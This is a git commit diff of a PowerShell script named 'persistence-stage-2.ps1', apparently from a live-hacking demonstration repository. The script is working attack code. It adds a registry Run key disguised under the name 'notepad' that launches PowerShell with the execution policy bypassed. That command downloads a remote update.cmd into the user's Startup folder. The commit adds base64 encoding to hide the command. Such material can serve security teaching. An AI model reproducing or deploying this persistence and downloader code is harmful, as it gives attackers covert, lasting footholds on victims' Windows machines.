26cae8452e159f15b3a506a648df10a94952d8a9
Melfice60 <96183356+Melfice60@users.noreply.github.com>
2024-06-05 14:10:13 +0200

    Update persistence-stage-2.ps1

--- persistence-stage-2.ps1
+++ persistence-stage-2.ps1
@@ -1,7 +1,8 @@
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
 # Définition de la commande PowerShell à exécuter au démarrage
-$commande = 'powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"'
+$commande = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"
+$commandeBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commande))
 
 # Création de la nouvelle valeur dans la clé de Registre "Run"
-New-ItemProperty -Path $regPath -Name "notepad" -Value "$commande" -PropertyType String -Force | Out-Null
+New-ItemProperty -Path $regPath -Name "notepad" -Value "powershell.exe -ExecutionPolicy Bypass -EncodedCommand '$commandeBase64'" -PropertyType String -Force | Out-Null
